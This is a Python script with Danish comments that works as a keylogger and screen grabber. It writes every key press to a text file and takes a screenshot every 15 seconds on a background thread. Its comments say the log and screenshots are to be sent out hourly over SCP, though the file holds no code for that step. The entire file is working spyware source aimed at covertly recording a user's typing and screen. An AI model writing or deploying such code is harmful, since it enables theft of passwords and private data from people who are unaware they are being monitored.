import keyboard
from time import sleep
import platform
import PIL
from PIL import ImageGrab, Image
import schedule
import time
import threading

#Der skal tages screenshots hver 5. min, gemmes i en mappe og navngives efter timestamp
#Log + screenshots skal sendes hver time
#2 threads - 1 til screenshots hvert 5 min, 1 til keylogger + screenshot hver time via SCP


###Keylogger####
def wipe_log():
    with open('tastelog.txt', 'w') as file:     # 'w' for write, så den åbner filen og overskriver det der er i den og wiper den. 
        file.write("")

def keylog(strokes):
    with open('tastelog.txt', 'a') as file:     # 'a' for append, fordi funktionen basically fungerer som et while True loop, og efter hver key press åbner den .txt filen og skriver det ned, så 'a' for append er nødvendigt, ellers ville den wipe det hver gang
        file.write(str(strokes.name))


###Screenshot####
def screenshot(): #.png skal gemmes some timestamp
    img = PIL.ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None, window=None)
    img.save("screenshot_keylogger.png")


###Schedule####
"""def schedule_sec():
    schedule.every(30).seconds.do(screenshot)
    while True:
        schedule.run_pending()
        time.sleep(1)"""

def run_continuously(interval=1):
    cease_continuous_run = threading.Event()

    class ScheduleThread(threading.Thread):
        @classmethod
        def run(cls):
            while not cease_continuous_run.is_set():
                schedule.run_pending()
                time.sleep(interval)

    continuous_thread = ScheduleThread()
    continuous_thread.start()
    return cease_continuous_run


schedule.every(15).seconds.do(screenshot)

# Start the background thread
stop_run_continuously = run_continuously()

# Do some other things...
#time.sleep(10)

# Stop the background thread
#stop_run_continuously.set()

###Main####
print("OS Name:", platform.system())
#schedule_sec()
screenshot()
wipe_log()
keyboard.on_press(keylog)
keyboard.wait('esc')


    



